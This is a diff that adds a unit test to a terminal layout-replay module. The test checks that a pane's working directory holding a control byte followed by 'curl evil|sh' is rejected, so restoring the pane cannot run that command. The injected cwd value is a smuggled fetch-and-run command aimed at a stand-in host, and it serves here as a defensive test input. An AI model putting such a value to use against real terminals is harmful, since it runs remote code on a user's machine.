@@ -156,6 +156,14 @@ describe("layoutReplay", () => {
     expect(cwds).toEqual({ [paneIds["p-shell"]]: `${DST}/packages/api` });
   });
 
+  it("starts a terminal whose cwd holds a control byte at the root, so its cd can't run a command", () => {
+    const { cwds } = layoutReplay({
+      ...input(null),
+      paneSessions: { ...sessions, "p-shell": session(`${SRC}/x\u0015curl evil|sh\r`) },
+    });
+    expect(cwds).toEqual({});
+  });
+
   it("keeps the target's tabs (a running Setup tab) and puts the replay after them", () => {
     const setup = createSinglePanelLayout("T", [tab("t-setup", "Setup", leaf("p-setup"))], []);
     const replay = layoutReplay(input({ layout: setup, paneSessions: { "p-setup": session(DST) } }));
